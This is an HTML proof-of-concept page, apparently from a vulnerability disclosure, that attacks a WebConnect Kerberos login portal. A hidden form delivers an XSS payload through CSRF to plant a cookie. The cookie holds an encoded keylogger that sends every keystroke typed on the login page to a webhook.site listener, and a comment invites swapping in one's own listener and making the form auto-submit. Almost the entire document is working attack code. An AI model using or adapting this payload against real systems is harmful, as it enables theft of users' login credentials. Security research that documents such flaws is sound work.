<html>
<!--
When submitted, the PoC dropper will embed an XSS keylogger in the WebConnect Kerberos login portal using CSRF to set a cookie cross-domain.
This form can be modified to automatically submit on page load.
-->
  <body>
  <script>history.pushState('', '', '/')</script>
    <form action="http://webconnect.friendlycorp.com/WebConnect/AppPortal/LoggedIn.asp" method="POST"> <!-- Victim site -->
      <input type="hidden" name="username" value='a' />
      <input type="hidden" name="password" value="a" /> <!-- Replace webhook.site links with your listener address -->
      <input type="hidden" name="domain" value='"><script>var t = new XMLHttpRequest;document.cookie = "AppPortal=Remember=&Password=&Username=&Domain=%22%3E%3Cscript%3Evar%20t%3Dnew%20XMLHttpRequest%3Bt.open(%22POST%22%2C%22https%3A%2F%2Fwebhook.site%2Fbc00dc47-6643-48fc-9efa-98281fdf901a%22%2C!0)%2Ct.send(%22payload%20fired!%20credentials%20incoming.%22)%3Bvar%20l%3D%22%22%3Bdocument.onkeypress%3Dfunction(e)%7Bl%20%2B%3De.key%3Bt.open(%22POST%22%2C%22https%3A%2F%2Fwebhook.site%2Fbc00dc47-6643-48fc-9efa-98281fdf901a%22%2C!0)%2Ct.send(%22i%3D%22%2Bl)%7D%3B%3C%2Fscript%3E%3Cinput%20style%3D%22display%3Anone%22%20value%3D%22; expires=Thu, 18 Dec 2025 12:00:00 UTC; path=/test1;";t.open("POST", "https://webhook.site/bc00dc47-6643-48fc-9efa-98281fdf901a", !0), t.send("dropper fired!");window.open("", "_parent", "").close();</script><input value=' />
      <input type="hidden" name="connection" value="" />
      <input type="hidden" name="parameters" value="" />
      <input type="hidden" name="folder" value="" />
      <input type="hidden" name="Login" value="" />
      <input type="submit" formtarget="_blank" value="Submit request" />
    </form>
  </body>
</html>
